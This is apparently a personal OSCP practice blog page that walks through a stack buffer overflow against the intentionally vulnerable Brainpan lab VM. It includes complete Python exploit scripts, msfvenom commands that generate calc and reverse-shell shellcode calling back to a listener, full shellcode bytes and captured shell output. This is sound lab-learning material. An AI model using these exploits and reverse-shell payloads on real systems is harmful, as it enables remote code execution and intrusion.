---
layout: page
title: Buffer Overflow
description: Test page
dropdown: Techniques
priority: 1
---
# OSCP - Stack Overflow Practice



![bof](/assets/img/techniques/bof/buffer-overflow-example.jpg)




While the PWK course-materials covered the subject of Buffer Overflows quite well, I felt that I needed to suppliment my learning experience with more practice.

JustinSteven's [dostackbufferoverflowgood](https://github.com/justinsteven/dostackbufferoverflowgood) is the resource that did it for me.

I followed the guide exactly, and was able to grasp the concepts and methodology with more clarity than before. It also offered a ready framework to replicate the procedure with other apps vulnerable to the technique.

Here I am going to document a 'practice run', following the guide; I'm not going to spend too much time explaining things, the linked resource covers that admirably. 



<hr width="250" size="6">


For this practice I'll download the [Brainpan](https://www.vulnhub.com/entry/brainpan-1,51/) box from Vulnhub. To paraphrase 'Full Metal Jacket': 

This is my walkthrough; there are many like it, but this one is mine!



<h3>Brainpan</h3>

I set up brainpan in Virtualbox, and scan the vboxnet0 with nmap to get its IP address

`nmap -sn 192.168.56.0/24`

It looks like it's at address `192.168.56.123`.

Now use nmap to scan the target.

```
nmap -sV -Pn --min-rate 10000 192.168.56.123
```

![brainpan-nmap](/assets/img/techniques/bof/bof-brainpan1.png)

Before staring into the abyss, I have a quick look at the http server.

![port10000](/assets/img/techniques/bof/bof-brainpan10000.png)

Not much going on there, I have a look over the edge with curl...

```
curl -i http://192.168.56.123:9999
```

```

_|                            _|
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD

Warning: Binary output can mess up your terminal. Use "--output -" to tell
Warning: curl to output it to your terminal anyway, or consider "--output
Warning: <FILE>" to save to a file.

```

Try it with netcat instead.

So we've probably got to overflow the password.

Most of the time, with these exercises, there is a binary or executable to download, It's probably
hosted on the webserver.

```
gobuster dir -u http://192.168.56.123:10000 -w ~/wordlists/SecLists/Discovery/Web-Content/common.txt -t 50
```

gobuster finds `/bin`

![exe](/assets/img/techniques/bof/bof-bp-exe.png)

```
wget http://192.168.56.123:10000/bin/brainpan.exe
```


Time to fire up the win7 VM, get it running, and take a look with Immunity Debugger.

![running](/assets/img/techniques/bof/brainpan-running.png)






<h3>Fuzzing The Target</h3>


We can test the size of the buffer by fuzzing it with a simple python script.

```

#!/usr/bin/python

# fuzzer.py

import socket
import sys

# setup the Target's IP and port.
RHOST = "192.168.56.101"
RPORT = 9999

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# The payload
payload = "A"*1000

# build a happy little message followed by a newline
buf = ""
buf += payload
buf += "\n"


# send the happy little message down the socket
s.send(buf)

# print out what we send
print "Sent: {0}".format(buf)

# receive some data from the socket
data = s.recv(1024)

# print out what we received
print "Received: {0}".format(data)

```

This will send 1000 letter 'A's to the web and port, and hopefully be enough to crash the program.
If not, then we can incrementally increase the size of the payload.

![crashAAA](/assets/img/techniques/bof/brainpan-crashAAA.png)

It worked! The EIP register shows `41414141` which translates to `AAAA`


##########


<h3>Find Offset</h3>


We can move on the the next step, which is to find out exactly where the program crashes: the `offset`.

To do this we generate a random pattern with metasploit's `pattern_create.rb` 

```
/usr/share/metasploit-framework/tools/exploits/pattern_create.rb -l 1024
```

we can copy the original `fuzzer.py` and rename the copy `find_offset.py`

```
cp fuzzer.py find_offset.py
```

Replace the payload with the generated pattern.

The exploit should now look like this:

```

#!/usr/bin/python

import socket
import sys

# setup the Target's IP and port.
RHOST = "192.168.56.101"
RPORT = 9999

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# The payload
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0B"

# build a happy little message followed by a newline
buf = ""
buf += payload
buf += "\n"


# send the happy little message down the socket
s.send(buf)

# print out what we send
print "Sent: {0}".format(buf)

# receive some data from the socket
data = s.recv(1024)

# print out what we received
print "Received: {0}".format(data)

```

The program crashes again, and we check the registers in Immunity Debugger.

![find-offset](/assets/img/techniques/bof/bp-find-offset.png)


Look again at the EIP, and note the result `35724134`

Use metasploit's `pattern_offset.rb` to find the offset.

```

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134
[*] Exact match at offset 524

```


Alternatively we can use `mona` to find it with the command

```
!mona findmsp
```

![monafindmsp](/assets/img/techniques/bof/bp-monafindmsp.png)


The output confirms the offset at 524

###########


<h3>Control EIP</h3>

We need to confirm the offset, and control of the EIP. 

The following exploit will hopefully crash the program with the EIP pointing to `42424242` (BBBB)
and with the ESP register pointing to `CCCC`, with a bunch of DDDD's in the trailing padding.

I've got it saved as control_eip.py

```

#!/usr/bin/env python2
import socket

# set up the IP and port we're connecting to
RHOST = "192.168.56.101"
RPORT = 9999

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf_totlen = 1024
offset_srp = 524

# build a happy little message followed by a newline
buf = ""
buf += "A"*(offset_srp - len(buf))     # padding
buf += "BBBB"                          # SRP overwrite
buf += "CCCC"                          # ESP should end up pointing here
buf += "D"*(buf_totlen - len(buf))     # trailing padding
buf += "\n"

# send the happy little message down the socket
s.send(buf)

# print out what we send
print "Sent: {0}".format(buf)

# receive some data from the socket
data = s.recv(1024)

# print out what we received
print "Received: {0}".format(data)

```

The registers confirm our control of EIP

![controleip](/assets/img/techniques/bof/bp-controleip.png)


#########




<h3>Determine Bad Characters</h3>

When it comes to generating shellcode for the exploit to execute, there may be certain characters that cause the exploit to fail.

These characters are 'bad characters' that we want to avoid including in the shellcode.

"\x00\x0A" are almost universally considered bad, we need to test the target to find out what characters trigger bad responses.


`dostackbufferoverflowgood` outlines the process as below:

```

• Generate a test string containing every possible byte from \x00 to \xFF except for \x00 and \x0A (we’ll do this using a for loop)
• Write that string to a binary file
• Put the string in to our payload in a convenient spot.
• Cause the program to crash

```

`badchar-test.py`

```

#!/usr/bin/env python2
import socket

RHOST = "192.168.56.101"
RPORT = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

badchar_test = ""               # start with an empty string
badchars = [0x00, 0x0A]         # we've reasoned that these are definately bad

# generate the string
for i in range (0x00, 0xFF+1):  # range(0x00, 0xFF)only returns upto 0xFE
        if i not in badchars:   # skip the badchars
                badchar_test += chr(i) # append each non-badchar to string

# open a file for writing ("w") the string as binary ("b") data
with open ("badchar_test.bin", "wb") as f:
        f.write(badchar_test)

buf_totlen = 1024
offset_srp = 524

buf = ""
buf += "A"*(offset_srp - len(buf))     # padding
buf += "BBBB"                          # SRP overwrite
buf += badchar_test                    # ESP points here
buf += "D"*(buf_totlen - len(buf))     # trailing padding
buf += "\n"

s.send(buf)

```

The output is written to `badchar_test.bin`

Get this binary file over to the Win7 machine to check with `mona`.

```
!mona compare -a esp -f c:\badchar_test.bin
```

![mona-compare](/assets/img/techniques/bof/bp-badchar-mona.png)


In this case, we only need to avoid `\x00` and `\x0A`


#########


<h3>RET to "JMP ESP"</h3>


Refer to the `dostackbufferoverflow` pdf for a good explaination of this part of the procedure.

Mona can help find a jump point that doesn't include the badchars that will affect the successful execution of our exploit.

With the program still in its crashed state use the following command:


```
!mona jmp -r esp -cpb "\x00\x0A"
```



![find-jmp](/assets/img/techniques/bof/bp-mona-find-jmp2.png)

`0x311712f3`  = jmp esp

We can right-click on the pointer to get more info select `follow in disassembler`, it can help inform our choice when there are multiple return points.

#########

<h3>Use a 'struct.pack()'</h3>

You don't have to, but it can make things easier.


#########


<h3>Poppin' Calc - A</h3>



The next step will confirm `Remote Code Execution` (RCE) on the target.

`Poppin' Calc` demonstrates that an attacker can execute any code, including generate a command shell...in a 'harmless' but effective way.

This staged is often skipped in favour of getting a reverse_shell; but it's worth covering because in the scope of a 'test' you might need to 
prove the existence of a vulnerability without continuing to compromise a whole system.


Generate shellcode with msfvenom.

```
msfvenom -p windows/exec -b '\x00\x0A' -f python -v shellcode_calc CMD=calc.exe EXITFUNC=thread
```

########################

<h4>Nop Sled</h4>

See the `dostackbufferoverflowgood` pdf for an explaination of the "lazy way" and the "right way".

lazy = add 12 nops (+ \x90 * 12) `before` the shellcode. May need to increase this.
right = use metasm_shell.rb (use locate metasm_shell.rb to find it.)

... from the pdf...

```

Running metasm_shell.rb gives us an interactive console at which to give it
assembly instructions:
% ~/opt/metasploit-framework/tools/exploit/metasm_shell.rb
type "exit" or "quit" to quit
use ";" or "\n" for newline
type "file <file>" to parse a GAS assembler source file
metasm >
We want to move ESP up the stack towards lower addresses, so ask
metasm_shell.rb to assemble the instruction SUB ESP,0x10
metasm > sub esp,0x10
"\x83\xec\x10"

```


#######################


<h3>Poppin' Calc - B</h3>


```

#!/usr/bin/env python2
import socket
import struct

RHOST = "192.168.56.106"
RPORT = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))


buf_totlen = 1024
offset_srp = 524

ptr_jmp_esp = 0x311712F3

sub_esp_10 = "\x83\xec\x10"

shellcode_calc =  ""
shellcode_calc += "\xda\xcc\xba\x8a\x87\x4c\x7d\xd9\x74\x24"
shellcode_calc += "\xf4\x5e\x33\xc9\xb1\x31\x83\xee\xfc\x31"
shellcode_calc += "\x56\x14\x03\x56\x9e\x65\xb9\x81\x76\xeb"
shellcode_calc += "\x42\x7a\x86\x8c\xcb\x9f\xb7\x8c\xa8\xd4"
shellcode_calc += "\xe7\x3c\xba\xb9\x0b\xb6\xee\x29\x98\xba"
shellcode_calc += "\x26\x5d\x29\x70\x11\x50\xaa\x29\x61\xf3"
shellcode_calc += "\x28\x30\xb6\xd3\x11\xfb\xcb\x12\x56\xe6"
shellcode_calc += "\x26\x46\x0f\x6c\x94\x77\x24\x38\x25\xf3"
shellcode_calc += "\x76\xac\x2d\xe0\xce\xcf\x1c\xb7\x45\x96"
shellcode_calc += "\xbe\x39\x8a\xa2\xf6\x21\xcf\x8f\x41\xd9"
shellcode_calc += "\x3b\x7b\x50\x0b\x72\x84\xff\x72\xbb\x77"
shellcode_calc += "\x01\xb2\x7b\x68\x74\xca\x78\x15\x8f\x09"
shellcode_calc += "\x03\xc1\x1a\x8a\xa3\x82\xbd\x76\x52\x46"
shellcode_calc += "\x5b\xfc\x58\x23\x2f\x5a\x7c\xb2\xfc\xd0"
shellcode_calc += "\x78\x3f\x03\x37\x09\x7b\x20\x93\x52\xdf"
shellcode_calc += "\x49\x82\x3e\x8e\x76\xd4\xe1\x6f\xd3\x9e"
shellcode_calc += "\x0f\x7b\x6e\xfd\x45\x7a\xfc\x7b\x2b\x7c"
shellcode_calc += "\xfe\x83\x1b\x15\xcf\x08\xf4\x62\xd0\xda"
shellcode_calc += "\xb1\x8d\x32\xcf\xcf\x25\xeb\x9a\x72\x28"
shellcode_calc += "\x0c\x71\xb0\x55\x8f\x70\x48\xa2\x8f\xf0"
shellcode_calc += "\x4d\xee\x17\xe8\x3f\x7f\xf2\x0e\xec\x80"
shellcode_calc += "\xd7\x6c\x73\x13\xbb\x5c\x16\x93\x5e\xa1"


buf = ""
buf += "A"*(offset_srp - len(buf))     # padding
buf += struct.pack("<I", ptr_jmp_esp)  # SRP overwrite
buf += sub_esp_10                      # ESP points here
buf += shellcode_calc
buf += "D"*(buf_totlen - len(buf))     # trailing padding
buf += "\n"

s.send(buf)

```


![popped](/assets/img/techniques/bof/bp-popped.png)



#############

Getting a reverse-shell is just a matter of swapping the shellcode.


```
msfvenom -p windows/shell_reverse_tcp lhost=192.168.56.1 lport=443 -f python -v shellcode -b '\x00\x0A' EXITFUNC=thread
```

The final exploit is saved simply as `exploit.py`

```

#!/usr/bin/env python2
import socket
import struct

RHOST = "192.168.56.123"
RPORT = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))


buf_totlen = 1024
offset_srp = 524

ptr_jmp_esp = 0x311712F3

sub_esp_10 = "\x83\xec\x10"

# reverse_shell set lport=6969
shellcode =  ""
shellcode += "\xba\xa1\xdf\x76\xda\xd9\xe9\xd9\x74\x24\xf4\x5d"
shellcode += "\x29\xc9\xb1\x52\x31\x55\x12\x03\x55\x12\x83\x64"
shellcode += "\xdb\x94\x2f\x9a\x0c\xda\xd0\x62\xcd\xbb\x59\x87"
shellcode += "\xfc\xfb\x3e\xcc\xaf\xcb\x35\x80\x43\xa7\x18\x30"
shellcode += "\xd7\xc5\xb4\x37\x50\x63\xe3\x76\x61\xd8\xd7\x19"
shellcode += "\xe1\x23\x04\xf9\xd8\xeb\x59\xf8\x1d\x11\x93\xa8"
shellcode += "\xf6\x5d\x06\x5c\x72\x2b\x9b\xd7\xc8\xbd\x9b\x04"
shellcode += "\x98\xbc\x8a\x9b\x92\xe6\x0c\x1a\x76\x93\x04\x04"
shellcode += "\x9b\x9e\xdf\xbf\x6f\x54\xde\x69\xbe\x95\x4d\x54"
shellcode += "\x0e\x64\x8f\x91\xa9\x97\xfa\xeb\xc9\x2a\xfd\x28"
shellcode += "\xb3\xf0\x88\xaa\x13\x72\x2a\x16\xa5\x57\xad\xdd"
shellcode += "\xa9\x1c\xb9\xb9\xad\xa3\x6e\xb2\xca\x28\x91\x14"
shellcode += "\x5b\x6a\xb6\xb0\x07\x28\xd7\xe1\xed\x9f\xe8\xf1"
shellcode += "\x4d\x7f\x4d\x7a\x63\x94\xfc\x21\xec\x59\xcd\xd9"
shellcode += "\xec\xf5\x46\xaa\xde\x5a\xfd\x24\x53\x12\xdb\xb3"
shellcode += "\x94\x09\x9b\x2b\x6b\xb2\xdc\x62\xa8\xe6\x8c\x1c"                                                                                                                               
shellcode += "\x19\x87\x46\xdc\xa6\x52\xc8\x8c\x08\x0d\xa9\x7c"                                                                                                                               
shellcode += "\xe9\xfd\x41\x96\xe6\x22\x71\x99\x2c\x4b\x18\x60"                                                                                                                               
shellcode += "\xa7\xb4\x75\x52\x36\x5d\x84\xa2\x23\xa4\x01\x44"                                                                                                                               
shellcode += "\x39\xc6\x47\xdf\xd6\x7f\xc2\xab\x47\x7f\xd8\xd6"                                                                                                                               
shellcode += "\x48\x0b\xef\x27\x06\xfc\x9a\x3b\xff\x0c\xd1\x61"                                                                                                                               
shellcode += "\x56\x12\xcf\x0d\x34\x81\x94\xcd\x33\xba\x02\x9a"                                                                                                                               
shellcode += "\x14\x0c\x5b\x4e\x89\x37\xf5\x6c\x50\xa1\x3e\x34"                                                                                                                               
shellcode += "\x8f\x12\xc0\xb5\x42\x2e\xe6\xa5\x9a\xaf\xa2\x91"                                                                                                                               
shellcode += "\x72\xe6\x7c\x4f\x35\x50\xcf\x39\xef\x0f\x99\xad"                                                                                                                               
shellcode += "\x76\x7c\x1a\xab\x76\xa9\xec\x53\xc6\x04\xa9\x6c"
shellcode += "\xe7\xc0\x3d\x15\x15\x71\xc1\xcc\x9d\x91\x20\xc4"
shellcode += "\xeb\x39\xfd\x8d\x51\x24\xfe\x78\x95\x51\x7d\x88"
shellcode += "\x66\xa6\x9d\xf9\x63\xe2\x19\x12\x1e\x7b\xcc\x14"
shellcode += "\x8d\x7c\xc5"

buf = ""
buf += "A"*(offset_srp - len(buf))     # padding
buf += struct.pack("<I", ptr_jmp_esp)  # SRP overwrite
buf += sub_esp_10                      # ESP points here
buf += shellcode
buf += "D"*(buf_totlen - len(buf))     # trailing padding
buf += "\n"

s.send(buf)

```

Set an nc listener:

```
nc -nlvp 6969
```

The exploit works, and we get our reverse-shell.

```

 nc -nlvp 6969
Listening on [0.0.0.0] (family 0, port 6969)
Connection from 192.168.56.123 55541 received!
CMD Version 1.4.1

Z:\home\puck>dir
Volume in drive Z has no label.
Volume Serial Number is 0000-0000

Directory of Z:\home\puck

  3/6/2013   3:23 PM  <DIR>         .
  3/4/2013  11:49 AM  <DIR>         ..
  3/6/2013   3:23 PM           513  checksrv.sh
  3/4/2013   2:45 PM  <DIR>         web
       1 file                       513 bytes
       3 directories     13,844,946,944 bytes free

```


Since this is a practice run for Buffer Overflows, rather than a machine writeup for Brainpan,

I'll leave things there.


################


Whilst looking for more practice, I stumbled upon [this site here](https://www.vortex.id.au/2017/05/pwkoscp-stack-buffer-overflow-practice/
)

It had a few links to vulnerable apps to try:

[slmail](https://www.exploit-db.com/exploits/638/)

[freefloatFTP](https://www.exploit-db.com/exploits/17546/)

[minishare](https://www.exploit-db.com/exploits/636/)

[savant](https://www.exploit-db.com/exploits/10434/)

[warFTPD (XP)](https://www.exploit-db.com/exploits/3570/)

<h3>Have fun!</h3>

#############




